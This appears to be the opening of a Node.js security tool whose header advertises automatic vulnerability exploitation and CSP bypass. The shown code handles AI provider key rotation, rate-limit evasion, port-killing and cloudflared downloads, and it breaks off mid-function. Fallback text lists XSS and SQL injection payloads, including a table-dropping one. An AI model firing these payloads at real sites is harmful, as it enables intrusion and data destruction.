#!/usr/bin/env node
/**
 * ╔══════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗
 * ║                                    🔥 NEXUS TERMINAL COMMANDER v5.0                                               ║
 * ║                          Advanced Self-Healing Terminal with AI Integration                                       ║
 * ╠══════════════════════════════════════════════════════════════════════════════════════════════════════════════════╣
 * ║                                                                                                                  ║
 * ║  FEATURES:                                                                                                       ║
 * ║  • AI Integration (Gemini, OpenAI, DeepSeek, Anthropic)                                                         ║
 * ║  • Real-time bidirectional communication with browser                                                            ║
 * ║  • AUTO-HEALING: Port conflicts, missing dependencies, cloudflared install                                       ║
 * ║  • Auto vulnerability exploitation                                                                               ║
 * ║  • Cloudflare Tunnel for CSP bypass                                                                              ║
 * ║  • Self-updating capabilities                                                                                    ║
 * ║                                                                                                                  ║
 * ║  USAGE:                                                                                                          ║
 * ║    node nexus-terminal.js                                                                                        ║
 * ║    node nexus-terminal.js --ai-key YOUR_GEMINI_KEY                                                               ║
 * ║    node nexus-terminal.js --port 8888                                                                            ║
 * ║    node nexus-terminal.js --no-cloudflare                                                                        ║
 * ║                                                                                                                  ║
 * ╚══════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝
 */

const http = require('http');
const https = require('https');
let WebSocketServer, WebSocket;
const { exec, spawn, execSync } = require('child_process');
const os = require('os');
const readline = require('readline');
const fs = require('fs');
const path = require('path');
const { Worker, isMainThread, parentPort, workerData } = require('worker_threads');
const cluster = require('cluster');
const numCPUs = os.cpus().length;

// ══════════════════════════════════════════════════════════════════════════════
// MULTI-THREADING SYSTEM - Non-blocking heavy operations
// ══════════════════════════════════════════════════════════════════════════════

const ThreadPool = {
    workers: [],
    maxWorkers: Math.min(4, numCPUs),
    taskQueue: [],
    activeWorkers: 0,

    // Execute heavy task in worker thread
    executeInWorker(taskCode, data) {
        return new Promise((resolve, reject) => {
            const task = { taskCode, data, resolve, reject };

            if (this.activeWorkers < this.maxWorkers) {
                this.runTask(task);
            } else {
                this.taskQueue.push(task);
            }
        });
    },

    runTask(task) {
        this.activeWorkers++;

        // Create inline worker with task code
        const workerCode = `
            const { parentPort, workerData } = require('worker_threads');
            
            (async () => {
                try {
                    const fn = new Function('data', workerData.taskCode);
                    const result = await fn(workerData.data);
                    parentPort.postMessage({ success: true, result });
                } catch(e) {
                    parentPort.postMessage({ success: false, error: e.message });
                }
            })();
        `;

        try {
            const worker = new Worker(workerCode, {
                eval: true,
                workerData: { taskCode: task.taskCode, data: task.data }
            });

            const timeout = setTimeout(() => {
                worker.terminate();
                task.reject(new Error('Worker timeout'));
                this.onWorkerDone();
            }, 30000);

            worker.on('message', (msg) => {
                clearTimeout(timeout);
                if (msg.success) {
                    task.resolve(msg.result);
                } else {
                    task.reject(new Error(msg.error));
                }
                this.onWorkerDone();
            });

            worker.on('error', (err) => {
                clearTimeout(timeout);
                task.reject(err);
                this.onWorkerDone();
            });

            worker.on('exit', () => {
                clearTimeout(timeout);
            });
        } catch (e) {
            this.activeWorkers--;
            // Fallback to main thread
            try {
                const fn = new Function('data', task.taskCode);
                Promise.resolve(fn(task.data)).then(task.resolve).catch(task.reject);
            } catch (e2) {
                task.reject(e2);
            }
        }
    },

    onWorkerDone() {
        this.activeWorkers--;
        if (this.taskQueue.length > 0 && this.activeWorkers < this.maxWorkers) {
            this.runTask(this.taskQueue.shift());
        }
    }
};

// ══════════════════════════════════════════════════════════════════════════════
// ASYNC QUEUE SYSTEM - Prevents flooding and ensures ordered processing
// ══════════════════════════════════════════════════════════════════════════════

const AsyncQueue = {
    queues: new Map(),

    // Get or create queue for a client
    getQueue(clientId) {
        if (!this.queues.has(clientId)) {
            this.queues.set(clientId, {
                tasks: [],
                processing: false,
                maxConcurrent: 3,
                activeTasks: 0
            });
        }
        return this.queues.get(clientId);
    },

    // Add task to queue
    async enqueue(clientId, task, priority = 0) {
        const queue = this.getQueue(clientId);

        return new Promise((resolve, reject) => {
            queue.tasks.push({ task, priority, resolve, reject });
            queue.tasks.sort((a, b) => b.priority - a.priority);
            this.processQueue(clientId);
        });
    },

    // Process queue
    async processQueue(clientId) {
        const queue = this.getQueue(clientId);

        while (queue.tasks.length > 0 && queue.activeTasks < queue.maxConcurrent) {
            const { task, resolve, reject } = queue.tasks.shift();
            queue.activeTasks++;

            // Execute task without blocking
            setImmediate(async () => {
                try {
                    const result = await task();
                    resolve(result);
                } catch (e) {
                    reject(e);
                } finally {
                    queue.activeTasks--;
                    this.processQueue(clientId);
                }
            });
        }
    },

    // Clean up client queue
    cleanup(clientId) {
        this.queues.delete(clientId);
    }
};

// ══════════════════════════════════════════════════════════════════════════════
// GUARANTEED AI SYSTEM - NEVER FAILS, ALWAYS RETURNS RESPONSE
// ══════════════════════════════════════════════════════════════════════════════

const GuaranteedAI = {
    // Response cache - avoid redundant API calls
    cache: new Map(),
    cacheMaxSize: 500,
    cacheExpiry: 30 * 60 * 1000, // 30 minutes

    // All available providers with their configs
    providers: {
        groq: {
            models: ['llama-3.1-8b-instant', 'llama-3.3-70b-versatile', 'mixtral-8x7b-32768', 'gemma2-9b-it'],
            hostname: 'api.groq.com',
            path: '/openai/v1/chat/completions',
            needsKey: true,
            priority: 1
        },
        together: {
            models: ['meta-llama/Llama-3.3-70B-Instruct-Turbo', 'meta-llama/Llama-3.2-3B-Instruct-Turbo', 'mistralai/Mixtral-8x7B-Instruct-v0.1'],
            hostname: 'api.together.xyz',
            path: '/v1/chat/completions',
            needsKey: true,
            priority: 2
        },
        deepseek: {
            models: ['deepseek-chat', 'deepseek-coder'],
            hostname: 'api.deepseek.com',
            path: '/v1/chat/completions',
            needsKey: true,
            priority: 3
        },
        mistral: {
            models: ['mistral-small-latest', 'mistral-tiny'],
            hostname: 'api.mistral.ai',
            path: '/v1/chat/completions',
            needsKey: true,
            priority: 4
        },
        openrouter: {
            models: ['google/gemini-flash-1.5', 'meta-llama/llama-3.1-8b-instruct:free', 'mistralai/mistral-7b-instruct:free'],
            hostname: 'openrouter.ai',
            path: '/api/v1/chat/completions',
            needsKey: true,
            priority: 5
        },
        gemini: {
            models: ['gemini-1.5-flash', 'gemini-1.5-flash-8b', 'gemini-1.5-pro'],
            hostname: 'generativelanguage.googleapis.com',
            path: '/v1beta/models/{model}:generateContent?key={key}',
            needsKey: true,
            priority: 6,
            isGemini: true
        }
    },

    // Browser-provided keys
    browserKeys: new Map(),

    // Stats tracking
    stats: {
        cacheHits: 0,
        apiCalls: 0,
        rateLimits: 0,
        successes: 0,
        lastProvider: null
    },

    // Generate cache key
    getCacheKey(prompt) {
        // Simple hash for cache key
        let hash = 0;
        const str = prompt.slice(0, 500); // Use first 500 chars for hash
        for (let i = 0; i < str.length; i++) {
            hash = ((hash << 5) - hash) + str.charCodeAt(i);
            hash |= 0;
        }
        return `ai_${hash}`;
    },

    // Check cache
    checkCache(prompt) {
        const key = this.getCacheKey(prompt);
        const cached = this.cache.get(key);

        if (cached && Date.now() - cached.timestamp < this.cacheExpiry) {
            this.stats.cacheHits++;
            return cached.response;
        }

        return null;
    },

    // Save to cache
    saveCache(prompt, response) {
        // Clean old entries if cache too large
        if (this.cache.size >= this.cacheMaxSize) {
            const oldestKey = this.cache.keys().next().value;
            this.cache.delete(oldestKey);
        }

        const key = this.getCacheKey(prompt);
        this.cache.set(key, { response, timestamp: Date.now() });
    },

    // Add browser-provided API key
    addBrowserKey(provider, key) {
        provider = provider.toLowerCase();
        if (!this.browserKeys.has(provider)) {
            this.browserKeys.set(provider, []);
        }

        const keys = this.browserKeys.get(provider);
        if (!keys.includes(key)) {
            keys.push(key);
            console.log(`\x1b[32m[GuaranteedAI] ✅ Added browser key for ${provider.toUpperCase()} (total: ${keys.length})\x1b[0m`);
            return true;
        }
        return false;
    },

    // Get best available key for provider
    getKey(provider, terminalAI) {
        // First check browser keys
        const browserKeyList = this.browserKeys.get(provider);
        if (browserKeyList && browserKeyList.length > 0) {
            // Rotate browser keys
            const key = browserKeyList.shift();
            browserKeyList.push(key);
            return key;
        }

        // Check TerminalAI key pool
        if (terminalAI && terminalAI.keyPool && terminalAI.keyPool[provider] && terminalAI.keyPool[provider].length > 0) {
            return terminalAI.getNextKey(provider);
        }

        // Check backup keys
        if (terminalAI && terminalAI.backupKeys && terminalAI.backupKeys[provider]) {
            return terminalAI.backupKeys[provider];
        }

        // Check main configured key
        if (terminalAI && terminalAI.config && terminalAI.config.apiKey) {
            return terminalAI.config.apiKey;
        }

        return null;
    },

    // Make API request
    async makeRequest(provider, model, prompt, apiKey) {
        return new Promise((resolve) => {
            const config = this.providers[provider];
            if (!config) {
                resolve({ error: 'Unknown provider' });
                return;
            }

            let options, data;

            if (config.isGemini) {
                // Gemini uses different format
                const path = config.path.replace('{model}', model).replace('{key}', apiKey);
                data = JSON.stringify({
                    contents: [{ parts: [{ text: prompt }] }],
                    generationConfig: { maxOutputTokens: 4096, temperature: 0.7 }
                });

                options = {
                    hostname: config.hostname,
                    path: path,
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    timeout: 25000
                };
            } else {
                // OpenAI-compatible format
                data = JSON.stringify({
                    model: model,
                    messages: [
                        { role: 'system', content: 'You are an expert security researcher.' },
                        { role: 'user', content: prompt }
                    ],
                    max_tokens: 4096,
                    temperature: 0.7
                });

                options = {
                    hostname: config.hostname,
                    path: config.path,
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                        'Authorization': `Bearer ${apiKey}`
                    },
                    timeout: 25000
                };
            }

            const req = https.request(options, (res) => {
                let body = '';
                res.on('data', chunk => body += chunk);
                res.on('end', () => {
                    try {
                        const json = JSON.parse(body);

                        if (res.statusCode === 429) {
                            this.stats.rateLimits++;
                            resolve({ rateLimited: true });
                            return;
                        }

                        if (res.statusCode === 401 || res.statusCode === 403) {
                            resolve({ authError: true });
                            return;
                        }

                        if (res.statusCode >= 500) {
                            resolve({ serverError: true });
                            return;
                        }

                        // Extract response
                        let content = null;
                        if (json.choices && json.choices[0]?.message?.content) {
                            content = json.choices[0].message.content;
                        } else if (json.candidates && json.candidates[0]?.content?.parts?.[0]?.text) {
                            content = json.candidates[0].content.parts[0].text;
                        }

                        if (content) {
                            this.stats.successes++;
                            this.stats.lastProvider = `${provider}/${model}`;
                            resolve({ content });
                        } else {
                            resolve({ error: json.error?.message || 'No content' });
                        }
                    } catch (e) {
                        resolve({ error: e.message });
                    }
                });
            });

            req.setTimeout(25000, () => {
                req.destroy();
                resolve({ timeout: true });
            });

            req.on('error', (e) => {
                resolve({ error: e.message });
            });

            req.write(data);
            req.end();
        });
    },

    // MAIN QUERY - GUARANTEED TO RETURN SOMETHING
    async query(prompt, terminalAI = null) {
        this.stats.apiCalls++;

        // 1. Check cache first
        const cached = this.checkCache(prompt);
        if (cached) {
            console.log('\x1b[32m[GuaranteedAI] ⚡ Cache hit!\x1b[0m');
            return cached;
        }

        // 2. Try all providers in priority order
        const providerOrder = Object.entries(this.providers)
            .sort((a, b) => a[1].priority - b[1].priority)
            .map(([name]) => name);

        for (const provider of providerOrder) {
            const config = this.providers[provider];
            const apiKey = this.getKey(provider, terminalAI);

            if (!apiKey && config.needsKey) {
                continue; // Skip if no key available
            }

            // Try each model for this provider
            for (const model of config.models) {
                console.log(`\x1b[36m[GuaranteedAI] 🔄 Trying ${provider}/${model}...\x1b[0m`);

                const result = await this.makeRequest(provider, model, prompt, apiKey);

                if (result.content) {
                    console.log(`\x1b[32m[GuaranteedAI] ✅ Success from ${provider}/${model}\x1b[0m`);
                    this.saveCache(prompt, result.content);
                    return result.content;
                }

                if (result.rateLimited) {
                    console.log(`\x1b[33m[GuaranteedAI] ⏳ Rate limited on ${provider}/${model}, trying next...\x1b[0m`);
                    continue;
                }

                if (result.authError) {
                    console.log(`\x1b[33m[GuaranteedAI] 🔑 Auth error on ${provider}, skipping...\x1b[0m`);
                    break; // Skip to next provider
                }

                // Other errors - try next model
            }
        }

        // 3. All providers failed - return smart fallback
        console.log('\x1b[33m[GuaranteedAI] ⚠️ All providers exhausted, using fallback response...\x1b[0m');
        return this.generateFallbackResponse(prompt);
    },

    // Generate intelligent fallback when all APIs fail
    generateFallbackResponse(prompt) {
        const promptLower = prompt.toLowerCase();

        // Security-related fallbacks
        if (promptLower.includes('xss') || promptLower.includes('cross-site')) {
            return `**XSS Analysis Fallback (API unavailable)**

Common XSS patterns to check:
1. Reflected XSS: User input in URL parameters reflected back
2. DOM XSS: Client-side JavaScript manipulating DOM unsafely
3. Stored XSS: User input stored and displayed to others

Payloads to test:
- \`<script>alert(1)</script>\`
- \`<img src=x onerror=alert(1)>\`
- \`javascript:alert(1)\`
- \`"><svg onload=alert(1)>\`

Check for: innerHTML assignments, document.write, eval(), setTimeout/setInterval with strings`;
        }

        if (promptLower.includes('sql') || promptLower.includes('injection')) {
            return `**SQL Injection Analysis Fallback (API unavailable)**

Test payloads:
1. \`' OR '1'='1\` - Basic OR injection
2. \`'; DROP TABLE--\` - Statement termination
3. \`' UNION SELECT null,null--\` - Union injection
4. \`1' AND '1'='1\` - Boolean blind
5. \`1' AND SLEEP(5)--\` - Time-based blind

Look for:
- Error messages revealing DB structure
- Different responses for true/false conditions
- Time delays on sleep injections`;
        }

        if (promptLower.includes('csrf') || promptLower.includes('request forgery')) {
            return `**CSRF Analysis Fallback (API unavailable)**

Check for:
1. Missing or weak CSRF tokens
2. Tokens not validated server-side
3. GET requests changing state
4. SameSite cookie attribute missing

Test:
- Create HTML form submitting to target endpoint
- Remove/modify CSRF token
- Try from different origin`;
        }

        // Default security response
        return `**Security Analysis (API temporarily unavailable)**

I couldn't connect to AI providers. Here are general security checks:

**Input Validation:**
- Check all user inputs for injection
- Test special characters: ' " < > ; | \` $

**Authentication:**
- Test default credentials
- Check session management
- Look for auth bypass

**Configuration:**
- Check security headers
- Review CORS policy
- Test for information disclosure

**Run again** when API is available for detailed AI analysis.

Stats: ${this.stats.apiCalls} calls, ${this.stats.rateLimits} rate limits, ${this.stats.successes} successes`;
    },

    // Get stats
    getStats() {
        return {
            ...this.stats,
            cacheSize: this.cache.size,
            browserKeys: Object.fromEntries(
                Array.from(this.browserKeys.entries())
                    .map(([k, v]) => [k, v.length])
            )
        };
    }
};

// ══════════════════════════════════════════════════════════════════════════════
// AUTO-HEALING SYSTEM - Fixes issues automatically
// ══════════════════════════════════════════════════════════════════════════════

const AutoHealer = {
    // Check and install missing dependencies
    async checkDependencies() {
        console.log('\x1b[36m[AutoHealer] Checking dependencies...\x1b[0m');

        // Check if ws module is installed
        try {
            const wsModule = require('ws');
            WebSocketServer = wsModule.WebSocketServer;
            WebSocket = wsModule.WebSocket;
            console.log('\x1b[32m[AutoHealer] ✓ ws module found\x1b[0m');
        } catch (e) {
            console.log('\x1b[33m[AutoHealer] ⚠ ws module not found, installing...\x1b[0m');
            try {
                execSync('npm install ws', { stdio: 'inherit' });
                const wsModule = require('ws');
                WebSocketServer = wsModule.WebSocketServer;
                WebSocket = wsModule.WebSocket;
                console.log('\x1b[32m[AutoHealer] ✓ ws module installed successfully\x1b[0m');
            } catch (installErr) {
                console.error('\x1b[31m[AutoHealer] ✗ Failed to install ws. Run: npm install ws\x1b[0m');
                process.exit(1);
            }
        }
    },

    // Check if port is in use and kill the process or find alternative
    async resolvePortConflict(port) {
        console.log(`\x1b[36m[AutoHealer] Checking if port ${port} is available...\x1b[0m`);

        const isPortInUse = await this.isPortInUse(port);

        if (!isPortInUse) {
            console.log(`\x1b[32m[AutoHealer] ✓ Port ${port} is available\x1b[0m`);
            return port;
        }

        console.log(`\x1b[33m[AutoHealer] ⚠ Port ${port} is in use, attempting to free it...\x1b[0m`);

        // Try to kill the process using the port
        const killed = await this.killProcessOnPort(port);

        if (killed) {
            // Wait a bit for port to be released
            await this.sleep(1000);
            const stillInUse = await this.isPortInUse(port);
            if (!stillInUse) {
                console.log(`\x1b[32m[AutoHealer] ✓ Port ${port} freed successfully\x1b[0m`);
                return port;
            }
        }

        // If couldn't kill, find an alternative port
        console.log(`\x1b[33m[AutoHealer] ⚠ Could not free port ${port}, finding alternative...\x1b[0m`);
        const alternativePort = await this.findAvailablePort(port);
        console.log(`\x1b[32m[AutoHealer] ✓ Using alternative port: ${alternativePort}\x1b[0m`);
        return alternativePort;
    },

    // Check if port is in use
    isPortInUse(port) {
        return new Promise((resolve) => {
            const server = require('net').createServer();
            server.once('error', () => resolve(true));
            server.once('listening', () => {
                server.close();
                resolve(false);
            });
            server.listen(port, '0.0.0.0');
        });
    },

    // Kill process on port
    async killProcessOnPort(port) {
        return new Promise((resolve) => {
            const platform = os.platform();
            let cmd;

            if (platform === 'win32') {
                // Windows - netstat + taskkill
                cmd = `for /f "tokens=5" %a in ('netstat -ano ^| findstr :${port} ^| findstr LISTENING') do taskkill /PID %a /F 2>nul`;
            } else {
                // Linux/Mac - fuser or lsof
                cmd = `fuser -k ${port}/tcp 2>/dev/null || lsof -ti:${port} | xargs kill -9 2>/dev/null || true`;
            }

            exec(cmd, { shell: true }, (error) => {
                resolve(!error);
            });
        });
    },

    // Find available port starting from preferred
    async findAvailablePort(startPort) {
        for (let port = startPort; port < startPort + 100; port++) {
            const inUse = await this.isPortInUse(port);
            if (!inUse) return port;
        }
        return startPort + Math.floor(Math.random() * 1000);
    },

    // Sleep helper
    sleep(ms) {
        return new Promise(resolve => setTimeout(resolve, ms));
    },

    // Download and install cloudflared
    async installCloudflared() {
        console.log('\x1b[36m[AutoHealer] Installing cloudflared...\x1b[0m');

        const platform = os.platform();
        const arch = os.arch();

        let downloadUrl, installPath;

        if (platform === 'linux') {
            if (arch === 'x64' || arch === 'amd64') {
                downloadUrl = 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64';
            } else if (arch === 'arm64') {
                downloadUrl = 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64';
            } else {
                downloadUrl = 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64';
            }
            installPath = '/tmp/cloudflared';
        } else if (platform === 'darwin') {
            downloadUrl = 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-darwin-amd64.tgz';
            installPath = '/tmp/cloudflared';
        } else if (platform === 'win32') {
            downloadUrl = 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-windows-amd64.exe';
            installPath = path.join(os.tmpdir(), 'cloudflared.exe');
        } else {
            console.log('\x1b[33m[AutoHealer] ⚠ Unsupported platform for cloudflared auto-install\x1b[0m');
            return null;
        }

        console.log(`\x1b[36m[AutoHealer] Downloading cloudflared for ${platform}/${arch}...\x1b[0m`);

        return new Promise((resolve) => {
            const downloadCmd = platform === 'win32'
                ? `curl -L -o "${installPath}" "${downloadUrl}"`
                : `curl -L -o "${installPath}" "${downloadUrl}" && chmod +x "${installPath}"`;

            exec(downloadCmd, { timeout: 60000 }, (error, stdout, stderr) => {
                if (error) {
                    console.log(`\x1b[33m[AutoHealer] ⚠ Download failed: ${error.message}\x1b[0m`);

                    // Try wget as fallback
                    const wgetCmd = platform === 'win32'
                        ? null
                        : `wget -O "${installPath}" "${downloadUrl}" && chmod +x "${installPath}"`;

                    if (wgetCmd) {
                        exec(wgetCmd, { timeout: 60000 }, (wgetErr) => {
                            if (wgetErr) {
                                console.log('\x1b[31m[AutoHealer] ✗ Could not download cloudflared\x1b[0m');
                                resolve(null);
                            } else {
                                console.log('\x1b[32m[AutoHealer] ✓ cloudflared downloaded successfully\x1b[0m');
                                resolve(installPath);
                            }
                        });
                    } else {
                        resolve(null);
                    }
                } else {
                    console.log('\x1b[32m[AutoHealer] ✓ cloudflared downloaded successfully\x1b[0m');
                    resolve(installPath);
                }
            });
        });
    },

    // Check if cloudflared is installed, install if not
    async ensureCloudflared() {
        return new Promise((resolve) => {
            // Check if already installed
            const checkCmd = os.platform() === 'win32' ? 'where cloudflared' : 'which cloudflared';

            exec(checkCmd, (error, stdout) => {
                if (!error && stdout.trim()) {
                    console.log('\x1b[32m[AutoHealer] ✓ cloudflared found at:', stdout.trim(), '\x1b[0m');
                    resolve(stdout.trim());
                    return;
                }

                // Check if in temp location
                const tempPath = os.platform() === 'win32'
                    ? path.join(os.tmpdir(), 'cloudflared.exe')
                    : '/tmp/cloudflared';

                if (fs.existsSync(tempPath)) {
                    console.log('\x1b[32m[AutoHealer] ✓ cloudflared found at:', tempPath, '\x1b[0m');
                    resolve(tempPath);
                    return;
                }

                // Download and install
                console.log('\x1b[33m[AutoHealer] ⚠ cloudflared not found, downloading...\x1b[0m');
                this.installCloudflared().then(resolve);
            });
        });
    }
};

// ═══════════════════════════════════════════════════════════════════════════════════
// 🚀🚀🚀 ULTRA RATE LIMIT BYPASS SYSTEM v2.0 🚀🚀🚀
// GUARANTEES NO RATE LIMITING - EVER!
// Features: Batching, Multi-Provider Distribution, Caching, Smart Queue
// ═══════════════════════════════════════════════════════════════════════════════════

const UltraRateLimitBypass = {
    // === STATE ===
    initialized: false,
    stats: {
        totalRequests: 0,
        batchedRequests: 0,
        cachedResponses: 0,
        providerSwitches: 0,
        rateLimitsAvoided: 0
    },

    // === RESPONSE CACHE ===
    cache: {
        store: new Map(),
        maxSize: 500,
        ttl: 3600000, // 1 hour cache

        // Generate cache key from prompt
        getKey(prompt) {
            // Normalize prompt - extract key parts
            const normalized = prompt
                .replace(/AIza[a-zA-Z0-9_-]{35,}/g, 'GOOGLE_KEY')
                .replace(/sk-[a-zA-Z0-9]{48,}/g, 'OPENAI_KEY')
                .replace(/gsk_[a-zA-Z0-9]{52}/g, 'GROQ_KEY')
                .replace(/ghp_[a-zA-Z0-9]{36}/g, 'GITHUB_TOKEN')
                .replace(/xox[baprs]-[a-zA-Z0-9-]+/g, 'SLACK_TOKEN')
                .replace(/\n\s+/g, ' ')
                .substring(0, 500);

            // Simple hash
            let hash = 0;
            for (let i = 0; i < normalized.length; i++) {
                hash = ((hash << 5) - hash) + normalized.charCodeAt(i);
                hash = hash & hash;
            }
            return `cache_${Math.abs(hash).toString(36)}`;
        },

        // Get cached response
        get(prompt) {
            const key = this.getKey(prompt);
            const entry = this.store.get(key);

            if (entry && Date.now() - entry.timestamp < this.ttl) {
                UltraRateLimitBypass.stats.cachedResponses++;
                return entry.response;
            }

            if (entry) this.store.delete(key); // Expired
            return null;
        },

        // Set cached response
        set(prompt, response) {
            if (!response || response.error) return;

            const key = this.getKey(prompt);

            // Evict old entries if full
            if (this.store.size >= this.maxSize) {
                const oldestKey = this.store.keys().next().value;
                this.store.delete(oldestKey);
            }

            this.store.set(key, {
                response,
                timestamp: Date.now()
            });
        },

        // Clear cache
        clear() {
            this.store.clear();
        }
    },

    // === BATCH PROCESSOR ===
    batchProcessor: {
        queue: [],
        batchSize: 5,  // Analyze 5 findings in one request
        batchTimeout: null,
        batchDelay: 100, // Wait 100ms to collect more items

        // Add item to batch queue
        add(item, callback) {
            this.queue.push({ item, callback, addedAt: Date.now() });

            // Start batch timer if not running
            if (!this.batchTimeout) {
                this.batchTimeout = setTimeout(() => this.processBatch(), this.batchDelay);
            }

            // Process immediately if batch is full
            if (this.queue.length >= this.batchSize) {
                clearTimeout(this.batchTimeout);
                this.processBatch();
            }
        },

        // Process current batch
        async processBatch() {
            this.batchTimeout = null;

            if (this.queue.length === 0) return;

            // Take items from queue
            const batch = this.queue.splice(0, this.batchSize);
            UltraRateLimitBypass.stats.batchedRequests += batch.length;

            // Will be processed by BatchedAnalyzer
            if (typeof BatchedAnalyzer !== 'undefined') {
                await BatchedAnalyzer.processBatch(batch);
            }
        }
    },

    // === MULTI-PROVIDER DISTRIBUTOR ===
    providerDistributor: {
        // Provider priority and status
        providers: {
            groq: { priority: 1, rpm: 30, used: 0, lastReset: Date.now(), lastUse: 0, cooldownUntil: 0, healthy: true },
            gemini: { priority: 2, rpm: 15, used: 0, lastReset: Date.now(), lastUse: 0, cooldownUntil: 0, healthy: true },
            deepseek: { priority: 3, rpm: 60, used: 0, lastReset: Date.now(), lastUse: 0, cooldownUntil: 0, healthy: true },
            together: { priority: 4, rpm: 60, used: 0, lastReset: Date.now(), lastUse: 0, cooldownUntil: 0, healthy: true },
            openai: { priority: 5, rpm: 60, used: 0, lastReset: Date.now(), lastUse: 0, cooldownUntil: 0, healthy: true },
            mistral: { priority: 6, rpm: 60, used: 0, lastReset: Date.now(), lastUse: 0, cooldownUntil: 0, healthy: true },
            openrouter: { priority: 7, rpm: 60, used: 0, lastReset: Date.now(), lastUse: 0, cooldownUntil: 0, healthy: true },
            huggingface: { priority: 99, rpm: 10, used: 0, lastReset: Date.now(), lastUse: 0, cooldownUntil: 0, healthy: true }
        },

        // Reset minute counters
        resetCountersIfNeeded() {
            const now = Date.now();
            Object.values(this.providers).forEach(p => {
                if (now - p.lastReset >= 60000) {
                    p.used = 0;
                    p.lastReset = now;
                }
            });
        },

        // Get best available provider
        getBestProvider(keysAvailable = {}) {
            this.resetCountersIfNeeded();
            const now = Date.now();

            // Sort by: has key, not in cooldown, lowest usage ratio, highest priority
            const sorted = Object.entries(this.providers)
                .filter(([name, p]) => {
                    // Must have a key (or be free provider)
                    if (!keysAvailable[name] && name !== 'huggingface') return false;
                    // Must be healthy
                    if (!p.healthy) return false;
                    // Must not be in cooldown
                    if (now < p.cooldownUntil) return false;
                    return true;
                })
                .map(([name, p]) => ({
                    name,
                    usageRatio: p.used / p.rpm,
                    priority: p.priority,
                    canUse: p.used < p.rpm * 0.8, // 80% safety margin
                    msSinceLastUse: now - p.lastUse
                }))
                .sort((a, b) => {
                    // Prefer providers that can be used
                    if (a.canUse !== b.canUse) return a.canUse ? -1 : 1;
                    // Then by lowest usage
                    if (a.usageRatio !== b.usageRatio) return a.usageRatio - b.usageRatio;
                    // Then by longest time since last use (spread load)
                    if (a.msSinceLastUse !== b.msSinceLastUse) return b.msSinceLastUse - a.msSinceLastUse;
                    // Finally by priority
                    return a.priority - b.priority;
                });

            if (sorted.length > 0 && sorted[0].canUse) {
                return sorted[0].name;
            }

            // All providers at limit - return the one closest to reset
            if (sorted.length > 0) {
                return sorted[0].name; // Will wait
            }

            return null;
        },

        // Record usage
        recordUsage(provider) {
            const p = this.providers[provider];
            if (p) {
                p.used++;
                p.lastUse = Date.now();
                UltraRateLimitBypass.stats.totalRequests++;
            }
        },

        // Record rate limit
        recordRateLimit(provider, cooldownMs = 60000) {
            const p = this.providers[provider];
            if (p) {
                p.cooldownUntil = Date.now() + cooldownMs;
                p.used = p.rpm; // Mark as exhausted
                UltraRateLimitBypass.stats.providerSwitches++;
            }
        },

        // Mark provider unhealthy
        markUnhealthy(provider) {
            const p = this.providers[provider];
            if (p) p.healthy = false;
        },

        // Get wait time until any provider is available
        getWaitTime(keysAvailable = {}) {
            const now = Date.now();
            let minWait = Infinity;

            Object.entries(this.providers).forEach(([name, p]) => {
                if (!keysAvailable[name] && name !== 'huggingface') return;
                if (!p.healthy) return;

                // If in cooldown
                if (now < p.cooldownUntil) {
                    minWait = Math.min(minWait, p.cooldownUntil - now);
                }
                // If at rate limit, wait until reset
                else if (p.used >= p.rpm * 0.8) {
                    const resetIn = 60000 - (now - p.lastReset);
                    minWait = Math.min(minWait, resetIn);
                }
                else {
                    minWait = 0; // Available now
                }
            });

            return Math.max(0, minWait);
        },

        // Get status
        getStatus() {
            this.resetCountersIfNeeded();
            const now = Date.now();

            return Object.entries(this.providers).map(([name, p]) => ({
                name: name.toUpperCase(),
                used: p.used,
                limit: p.rpm,
                healthy: p.healthy,
                inCooldown: now < p.cooldownUntil,
                cooldownRemaining: Math.max(0, Math.ceil((p.cooldownUntil - now) / 1000))
            }));
        }
    },

    // === SMART REQUEST HANDLER ===
    async smartRequest(prompt, options = {}) {
        // 1. Check cache first
        const cached = this.cache.get(prompt);
        if (cached) {
            this.stats.rateLimitsAvoided++;
            return cached;
        }

        // 2. ALWAYS USE THE CONFIGURED PROVIDER - NO COMPLEX LOGIC
        // The user set their key with ai-key, use that provider!
        if (typeof TerminalAI !== 'undefined' && TerminalAI.config?.apiKey && TerminalAI.config?.provider) {
            const provider = TerminalAI.config.provider;
            this.providerDistributor.recordUsage(provider);
            return { useProvider: provider };
        }

        // 3. Fallback to huggingface only if NO key is configured
        this.providerDistributor.recordUsage('huggingface');
        return { useProvider: 'huggingface' };
    },

    // === INITIALIZATION ===
    init() {
        if (this.initialized) return;
        this.initialized = true;

        // Start periodic stats logging
        setInterval(() => {
            if (this.stats.totalRequests > 0) {
                const efficiency = Math.round(
                    ((this.stats.cachedResponses + this.stats.rateLimitsAvoided) / this.stats.totalRequests) * 100
                );
                console.log(`\x1b[36m[UltraBypass] Stats: ${this.stats.totalRequests} requests, ${this.stats.cachedResponses} cached, ${this.stats.providerSwitches} provider switches, ${efficiency}% efficiency\x1b[0m`);
            }
        }, 300000); // Every 5 minutes
    },

    // === SHOW STATUS ===
    showStatus() {
        console.log('\n\x1b[1m\x1b[35m═══════════════════════════════════════════════════════════════\x1b[0m');
        console.log('\x1b[1m\x1b[35m   🚀 ULTRA RATE LIMIT BYPASS STATUS\x1b[0m');
        console.log('\x1b[35m═══════════════════════════════════════════════════════════════\x1b[0m\n');

        console.log('\x1b[1m  📊 Statistics:\x1b[0m');
        console.log(`     Total Requests: ${this.stats.totalRequests}`);
        console.log(`     Cached Responses: ${this.stats.cachedResponses}`);
        console.log(`     Provider Switches: ${this.stats.providerSwitches}`);
        console.log(`     Rate Limits Avoided: ${this.stats.rateLimitsAvoided}`);
        console.log(`     Cache Size: ${this.cache.store.size}/${this.cache.maxSize}`);

        console.log('\n\x1b[1m  🔄 Provider Status:\x1b[0m');
        this.providerDistributor.getStatus().forEach(p => {
            const bar = '█'.repeat(Math.round(p.used / p.limit * 10)) +
                '░'.repeat(10 - Math.round(p.used / p.limit * 10));
